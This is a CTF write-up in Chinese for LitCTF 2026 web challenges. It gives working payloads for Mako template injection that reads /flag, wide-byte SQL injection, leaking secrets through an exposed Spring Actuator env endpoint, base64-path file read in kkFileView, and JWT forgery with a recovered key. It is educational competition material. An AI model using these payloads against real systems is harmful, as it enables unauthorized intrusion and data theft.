---
title: LitCTF 2026
description: WEB writeup

date: 2026-05-23T11:12:52+08:00
lastmod: 2026-03-23T12:15:52+08:00
---
# lit_ezssti

一上午连个1都waf你告诉我到11点突然{{7*7}}都不waf了什么意思修复了是吧（

```
<%raise Exception(getattr(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)),chr(114)+chr(101)+chr(97)+chr(100))())%>
```

Mako/Python 模板 报错回显

```
flag{5osawx2i-acfr-4us-8jfa-7qyjcumnsg9xu}
```

# lit_ezsql

debug=1 加 宽字节绕过

```
%df%27 union select 1,2,3,4,flag from flag_store%23&debug=1
```

```
查询结果
id	name	col2	col3	col4
1	2	3	4	flag{bqegz84c-x0vn-4ua-8kzl-6gs0pfp6tvjhp}
```

# 华辰企业服务运营平台

dirsearch到[11:49:05] 200 -    2KB - /actuator

访问得到

```
{"_links":{"self":{"href":"http://challenge.cyclens.tech:32729/actuator","templated":false},"beans":{"href":"http://challenge.cyclens.tech:32729/actuator/beans","templated":false},"caches":{"href":"http://challenge.cyclens.tech:32729/actuator/caches","templated":false},"caches-cache":{"href":"http://challenge.cyclens.tech:32729/actuator/caches/{cache}","templated":true},"health":{"href":"http://challenge.cyclens.tech:32729/actuator/health","templated":false},"health-path":{"href":"http://challenge.cyclens.tech:32729/actuator/health/{*path}","templated":true},"info":{"href":"http://challenge.cyclens.tech:32729/actuator/info","templated":false},"conditions":{"href":"http://challenge.cyclens.tech:32729/actuator/conditions","templated":false},"configprops":{"href":"http://challenge.cyclens.tech:32729/actuator/configprops","templated":false},"env-toMatch":{"href":"http://challenge.cyclens.tech:32729/actuator/env/{toMatch}","templated":true},"env":{"href":"http://challenge.cyclens.tech:32729/actuator/env","templated":false},"loggers":{"href":"http://challenge.cyclens.tech:32729/actuator/loggers","templated":false},"loggers-name":{"href":"http://challenge.cyclens.tech:32729/actuator/loggers/{name}","templated":true},"heapdump":{"href":"http://challenge.cyclens.tech:32729/actuator/heapdump","templated":false},"threaddump":{"href":"http://challenge.cyclens.tech:32729/actuator/threaddump","templated":false},"metrics-requiredMetricName":{"href":"http://challenge.cyclens.tech:32729/actuator/metrics/{requiredMetricName}","templated":true},"metrics":{"href":"http://challenge.cyclens.tech:32729/actuator/metrics","templated":false},"scheduledtasks":{"href":"http://challenge.cyclens.tech:32729/actuator/scheduledtasks","templated":false},"mappings":{"href":"http://challenge.cyclens.tech:32729/actuator/mappings","templated":false}}}
```

可以发现env接口说明环境变量泄露

那么直接

```
http://challenge.cyclens.tech:32729/actuator/env/FLAG
```

```
{"property":{"source":"systemEnvironment","value":"flag{fukki7lx-udzw-4eu-85sn-fqvz1hbmmcmtt}"},"activeProfiles":[],"propertySources":[{"name":"server.ports"},{"name":"servletConfigInitParams"},{"name":"servletContextInitParams"},{"name":"systemProperties"},{"name":"systemEnvironment","property":{"value":"flag{fukki7lx-udzw-4eu-85sn-fqvz1hbmmcmtt}","origin":"System Environment Property \"FLAG\""}},{"name":"random"},{"name":"applicationConfig: [classpath:/application.yml]"},{"name":"Management Server"}]}
```

```
flag{fukki7lx-udzw-4eu-85sn-fqvz1hbmmcmtt}
```

盲猜这个非预期了

# Northbridge Document Hub

开局一个源代码泄露

[challenge.cyclens.tech:31135/assets/js/portal.js](http://challenge.cyclens.tech:31135/assets/js/portal.js)

```
(function () {
    var bootstrap = {
        release: "2026.03.01-r12",
        region: "cn-sh2",
        auth: {
            mode: "legacy-fallback",
            // researcher:Research#2026
            seed: "cmVzZWFyY2hlcjpSZXNlYXJjaCMyMDI2"
        },
        fileGateway: {
            path: "/kkfileview/getCorsFile",
            queryKey: "urlPath",
            node: "legacy-parse-02"
        }
    };

    window.NorthbridgePortal = {
        config: bootstrap,
        decodeLegacyCredential: function () {
            try {
                return atob(bootstrap.auth.seed);
            } catch (e) {
                return "";
            }
        }
    };

    var form = document.querySelector("form[data-auth='portal']");
    if (form) {
        form.addEventListener("submit", function () {
            form.classList.add("is-submitting");
        });
    }
})();
```

账户密码直接给了

researcher

Research#2026

然后还有个文件接口

```
fileGateway: {
            path: "/kkfileview/getCorsFile",
            queryKey: "urlPath",
            node: "legacy-parse-02"
```

测试之后发现是base64路径

/kkfileview/getCorsFile?urlPath=L3Vzci9sb2NhbC9iaW4vZG9ja2VyLWVudHJ5cG9pbnQuc2g=

直接读容器启动脚本

```
#!/bin/sh
set -eu

# Pick dynamic flag from common CTF platforms.
if [ "${DASFLAG:-}" ]; then
    INSERT_FLAG="$DASFLAG"
    export DASFLAG="no_FLAG"
elif [ "${FLAG:-}" ]; then
    INSERT_FLAG="$FLAG"
    export FLAG="no_FLAG"
elif [ "${GZCTF_FLAG:-}" ]; then
    INSERT_FLAG="$GZCTF_FLAG"
    export GZCTF_FLAG="no_FLAG"
else
    INSERT_FLAG="flag{TEST_Dynamic_FLAG}"
fi

CACHE_DIR="/opt/kkfileview/cache/parsed"
ZIP_NAME="q1_finance_report_2026.zip"

mkdir -p "$CACHE_DIR"

# Rebuild challenge artifacts on each container start so the flag is dynamic.
printf '%s\n' \
  'cd /opt/kkfileview/bin' \
  './startup.sh --cache.dir=/opt/kkfileview/cache/parsed' \
  'java -jar kkFileView.jar --cache.dir=/opt/kkfileview/cache/parsed --forceUpdatedCache=true' \
  'cp /opt/kkfileview/cache/parsed/q1_finance_report_2026.zip /tmp/q1_finance_report_2026.zip' \
  > /root/.bash_history

echo "$INSERT_FLAG" > /tmp/flag.txt
(
    cd /tmp
    rm -f "${CACHE_DIR}/${ZIP_NAME}"
    jar -cf "${CACHE_DIR}/${ZIP_NAME}" flag.txt
)
rm -f /tmp/flag.txt

exec "$@"

```

知道了文件名直接读

/kkfileview/getCorsFile?urlPath=cTFfZmluYW5jZV9yZXBvcnRfMjAyNi56aXA=

下载下来里面有flag.txt

```
flag{lh07yvhc-jbsx-4ku-8svv-gx1nbjxe03zzx}
```

# lit_reverse_my_web

还有逆向题666

鉴权是jwt那么直接定位jwt相关伪C

![image-20260523122505947](https://img.ecxwxz.top/file/tgs_eyJ2IjoxLCJmIjoiQWdBQ0FnRUFBeUVHQUFUaFBrX2FBQU1oYWhFc0NJSmJObklRN3hCZUEwS19iYnRnWlNvQUFzTUxheHY1bzVGRVl5X0xvSmVRTm9FQkFBTUNBQU41QUFNN0JBIiwiZSI6InBuZyIsIm4iOiJjbGlwYm9hcmRfMTc3OTUxMDI4MDA1Ny5wbmciLCJtIjoiaW1hZ2UvcG5nIiwicyI6Mjg2MDQsInQiOjE3Nzk1MTAyODExMDQsIm1pZCI6MzN9.qrWMB4izKBHb2qnh2jIK4HStA_5Xe69HtxED_qYB0iM.png)

xor 0x5A解密到真jwt

定位到enc

![clipboard_1779510716661.png](https://img.ecxwxz.top/file/tgs_eyJ2IjoxLCJmIjoiQWdBQ0FnRUFBeUVHQUFUaFBrX2FBQU1qYWhFdHZyWVZWWFFWWHRVTG1zWHRRZGduYmZZQUFzUUxheHY1bzVGRVA0b0txQnEtTGNVQkFBTUNBQU4zQUFNN0JBIiwiZSI6InBuZyIsIm4iOiJjbGlwYm9hcmRfMTc3OTUxMDcxNjY2MS5wbmciLCJtIjoiaW1hZ2UvcG5nIiwicyI6MTQ0NTI1LCJ0IjoxNzc5NTEwNzE4NTU1LCJtaWQiOjM1fQ.qh3mb7vI_Y6fzWYuA1C1ob6vjIhJ_nWs_Qjmyewivik.png)

然后xor 0x5a解密得到

![clipboard_1779510961863.png](https://img.ecxwxz.top/file/tgs_eyJ2IjoxLCJmIjoiQWdBQ0FnRUFBeUVHQUFUaFBrX2FBQU1sYWhFdXN3eUJzOFpKMzRaTV9mNnV6dkdyTVhrQUFzVUxheHY1bzVGRU0yTURwZlYzdFBrQkFBTUNBQU41QUFNN0JBIiwiZSI6InBuZyIsIm4iOiJjbGlwYm9hcmRfMTc3OTUxMDk2MTg2My5wbmciLCJtIjoiaW1hZ2UvcG5nIiwicyI6MzY4NTgsInQiOjE3Nzk1MTA5NjQwMTgsIm1pZCI6Mzd9.fEdHSCWkKkx32DBPT2lCKzRvQOu1nXbnWbnpYCCw7Fg.png)

jwtkey

```
rMw_2026_litctf_jwt_secret_key!!
```

去jwt.io把role改成admin拿jwtkey签名访问/flag

```
flag{doxt45dw-jdtj-4dr-8o8n-s91ivb2yuuvan}
```



